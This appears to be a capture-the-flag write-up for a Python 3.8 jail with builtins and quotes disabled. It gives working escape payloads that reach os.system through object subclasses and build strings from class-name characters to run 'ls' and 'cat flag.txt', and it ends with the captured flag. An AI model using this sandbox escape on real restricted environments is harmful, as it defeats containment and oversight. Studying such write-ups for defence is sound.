Python 3.8 shell with builtins disabled and quotes disallowed we have to construct the strings we want/need from others we can access

Prefix
```py
a=().__class__.__base__.__subclasses__();
```

Target
```py
[ x.__init__.__globals__ for x in ().__class__.__base__.__subclasses__() if x.__name__ == '_wrap_close' ][0]['system']('ls')
```

```py
_wrap_close
a[80].__name__[0]+a[1].__name__[0]+a[12].__name__[0]+a[117].__name__[0]+a[28].__name__[0]+a[80].__name__[0]+a[25].__name__[0]+a[7].__name__[0]+a[20].__name__[0]+a[11].__name__[0]+a[32].__name__[0]
```

```py
system
a[11].__name__[0]+a[5].__name__[1]+a[11].__name__[0]+a[10].__name__[0]+a[32].__name__[0]+a[29].__name__[0]
```

```py
ls
a[7].__name__[0]+a[11].__name__[0]
```

Final `ls` command
```py
[ x.__init__.__globals__ for x in ().__class__.__base__.__subclasses__() if x.__name__ == a[80].__name__[0]+a[1].__name__[0]+a[12].__name__[0]+a[117].__name__[0]+a[28].__name__[0]+a[80].__name__[0]+a[25].__name__[0]+a[7].__name__[0]+a[20].__name__[0]+a[11].__name__[0]+a[32].__name__[0] ][0][a[11].__name__[0]+a[5].__name__[1]+a[11].__name__[0]+a[10].__name__[0]+a[32].__name__[0]+a[29].__name__[0]](a[7].__name__[0]+a[11].__name__[0])
```

```py
cat flag.txt
a[25].__name__[0]+a[117].__name__[0]+a[10].__name__[0]+a[0].__doc__[20]+a[26].__name__[0]+a[7].__name__[0]+a[117].__name__[0]+a[41].__name__[0]+a[4].__doc__[156]+a[10].__name__[0]+a[2].__name__[15]+a[10].__name__[0]
```

Final `cat flag.txt` command
```py
[ x.__init__.__globals__ for x in ().__class__.__base__.__subclasses__() if x.__name__ == a[80].__name__[0]+a[1].__name__[0]+a[12].__name__[0]+a[117].__name__[0]+a[28].__name__[0]+a[80].__name__[0]+a[25].__name__[0]+a[7].__name__[0]+a[20].__name__[0]+a[11].__name__[0]+a[32].__name__[0] ][0][a[11].__name__[0]+a[5].__name__[1]+a[11].__name__[0]+a[10].__name__[0]+a[32].__name__[0]+a[29].__name__[0]](a[25].__name__[0]+a[117].__name__[0]+a[10].__name__[0]+a[0].__doc__[20]+a[26].__name__[0]+a[7].__name__[0]+a[117].__name__[0]+a[41].__name__[0]+a[4].__doc__[156]+a[10].__name__[0]+a[2].__name__[15]+a[10].__name__[0])
```

```
CHTB{n0_j4il_c4n_h4ndl3_m3!}
```